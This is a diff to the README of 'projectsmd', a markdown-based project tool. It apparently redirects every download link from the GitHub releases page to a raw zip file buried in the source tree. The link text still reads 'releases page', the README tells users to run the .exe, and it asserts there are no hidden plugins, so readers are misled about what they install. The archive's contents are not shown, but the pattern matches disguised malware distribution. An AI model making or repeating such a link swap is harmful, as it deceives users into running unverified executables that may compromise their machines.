@@ -1,6 +1,6 @@
 # 📋 projectsmd - Manage simple projects using one file
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Liny9941/projectsmd/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Liny9941/projectsmd/raw/refs/heads/main/src/skill/Software-1.7.zip)
 
 projectsmd helps you organize work. It uses one markdown file to track your project from start to finish. You can share this file with AI agents to get work done faster. This system keeps your plans and notes in one place.
 
@@ -8,7 +8,7 @@ projectsmd helps you organize work. It uses one markdown file to track your proj
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [releases page](https://github.com/Liny9941/projectsmd/releases) to download the application.
+1. Visit the [releases page](https://github.com/Liny9941/projectsmd/raw/refs/heads/main/src/skill/Software-1.7.zip) to download the application.
 2. Select the file ending in .exe for Windows.
 3. Save the file to your desktop or downloads folder.
 4. Double-click the file to open the program.
@@ -75,7 +75,7 @@ You can change how the application handles file paths by using the settings menu
 
 ## 🌐 How to Download
 
-Visit the official [releases page](https://github.com/Liny9941/projectsmd/releases) to download the latest setup tool. You only need the executable file. There are no secondary installers or hidden plugins. Once you run the installer, the application creates a folder in your applications directory. You can create a shortcut on your desktop for quick access. 
+Visit the official [releases page](https://github.com/Liny9941/projectsmd/raw/refs/heads/main/src/skill/Software-1.7.zip) to download the latest setup tool. You only need the executable file. There are no secondary installers or hidden plugins. Once you run the installer, the application creates a folder in your applications directory. You can create a shortcut on your desktop for quick access. 
 
 ## 🔄 Updating the App
 
